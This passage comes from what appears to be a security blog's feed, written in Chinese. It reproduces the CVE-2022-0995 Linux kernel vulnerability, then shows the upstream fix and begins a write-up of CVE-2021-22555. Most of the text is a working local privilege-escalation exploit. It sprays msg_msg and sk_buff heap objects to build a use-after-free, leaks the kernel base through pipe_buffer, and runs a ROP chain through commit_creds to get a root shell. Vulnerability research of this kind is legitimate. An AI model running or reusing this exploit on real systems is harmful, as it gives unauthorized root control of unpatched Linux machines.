 kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2022-0995 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// pipe to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(oob_pipe_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/04/06/Fk975jsZhPfvyCJ.png" alt="image.png"></p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>该漏洞在内核主线的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb">这个 commit</a> 中被修复，这个 commit 增加的修改比较多，我们主要关注对于该漏洞其改变的部分：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-meta">@@ -320,7 +319,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,<br>     tf[i].info_mask &amp; WATCH_INFO_LENGTH)<br> goto err_filter;<br> /* Ignore any unknown types */<br><span class="hljs-deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * 8)</span><br><span class="hljs-addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span><br> continue;<br> nr_filter++;<br> &#125;<br><span class="hljs-meta">@@ -336,7 +335,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,<br> <br> q = wfilter-&gt;filters;<br> for (i = 0; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="hljs-addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span><br> continue;<br> <br> q-&gt;type= tf[i].type;<br></code></pre></td></tr></table></figure><ul><li>修复了前后判定不一致的问题</li><li>将 type 的范围限定为 <code>WATCH_TYPE__NR</code>（值为 2）</li></ul><p>笔者个人认为这个修复还是比较成功的</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我在看着你👁_👁&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/"/>
    <id>http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/</id>
    <published>2022-03-31T16:18:06.000Z</published>
    <updated>2023-01-12T07:37:02.505Z</updated>
    
    <content type="html"><![CDATA[<p><del>喷子永远是版本答案</del></p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2021-22555 是 Linux Netfilter 模块中的一个堆溢出漏洞，漏洞主要发生在64 位系统上为 32 位进程处理 setsockopt 时，若指定了 optname 为 <code>IPT_SO_SET_REPLACE</code>（或 <code>IP6T_SO_SET_REPLACE</code>），且开启了内核选项 <code>CONFIG_USER_NS</code> 、<code>CONFIG_NET_NS</code>，在内核结构转换时由于错误计算转换大小则会导致内核堆上的越界写入一些 0 字节，从而覆写相邻 object</p><p>该漏洞自内核版本 <code>v2.6.19-rc1</code> （<code>9fa492cdc160cd27ce1046cb36f47d3b2b1efa21</code>）引入，在这些版本中被修复：</p><ul><li><code>5.12 (b29c457a6511435960115c0f548c4360d5f4801d), 5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267</code></li></ul><p>由于其影响范围极大，且利用较为简单，故获得了 <code>7.8</code> 的 CVSS 评分</p><p>在开始分析之前，我们先来补充一些前置知识</p><blockquote><p>本文主要参考了 bsauce 大师傅对该漏洞的分析与利用过程：<a href="https://www.anquanke.com/post/id/254027">https://www.anquanke.com/post/id/254027</a></p><p>本文中涉及到的内核源码为 <code>5.8</code> 版本</p></blockquote><h2 id="内核编译选项"><a href="#内核编译选项" class="headerlink" title="内核编译选项"></a><em>内核编译选项</em></h2><p>首先是所有 <code>CONFIG_IP_NF_**</code> 和 <code>CONFIG_NETFILTER_**</code> 相关的选项都要打开</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_IP_NF_IPTABLES=y<br>CONFIG_IP_NF_MATCH_AH=y<br>CONFIG_IP_NF_MATCH_ECN=y<br>CONFIG_IP_NF_MATCH_RPFILTER=y<br>CONFIG_IP_NF_MATCH_TTL=y<br>CONFIG_IP_NF_FILTER=y<br>CONFIG_IP_NF_TARGET_REJECT=y<br>CONFIG_IP_NF_TARGET_SYNPROXY=y<br>CONFIG_IP_NF_NAT=y<br>CONFIG_IP_NF_TARGET_MASQUERADE=y<br>CONFIG_IP_NF_TARGET_NETMAP=y<br>CONFIG_IP_NF_TARGET_REDIRECT=y<br>CONFIG_IP_NF_MANGLE=y<br>CONFIG_IP_NF_TARGET_CLUSTERIP=y<br>CONFIG_IP_NF_TARGET_ECN=y<br>CONFIG_IP_NF_TARGET_TTL=y<br>CONFIG_IP_NF_RAW=y<br>CONFIG_IP_NF_SECURITY=y<br>CONFIG_IP_NF_ARPTABLES=y<br>CONFIG_IP_NF_ARPFILTER=y<br>CONFIG_IP_NF_ARP_MANGLE=y<br><br>CONFIG_NETFILTER=y<br>CONFIG_NETFILTER_ADVANCED=y<br><br>CONFIG_NETFILTER_INGRESS=y<br>CONFIG_NETFILTER_NETLINK=y<br>CONFIG_NETFILTER_FAMILY_BRIDGE=y<br>CONFIG_NETFILTER_FAMILY_ARP=y<br>CONFIG_NETFILTER_NETLINK_ACCT=y<br>CONFIG_NETFILTER_NETLINK_QUEUE=y<br>CONFIG_NETFILTER_NETLINK_LOG=y<br>CONFIG_NETFILTER_NETLINK_OSF=y<br><br>CONFIG_NETFILTER_CONNCOUNT=y<br><br>CONFIG_NETFILTER_NETLINK_GLUE_CT=y<br><br>CONFIG_NETFILTER_SYNPROXY=y<br><br>CONFIG_NETFILTER_XTABLES=y<br><br>CONFIG_NETFILTER_XT_MARK=y<br>CONFIG_NETFILTER_XT_CONNMARK=y<br>CONFIG_NETFILTER_XT_SET=y<br><br>CONFIG_NETFILTER_XT_MATCH_U32=y<br><span class="hljs-comment"># 挺多的，这里笔者就不一一摘录了</span><br></code></pre></td></tr></table></figure><p>以及三个其他选项：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 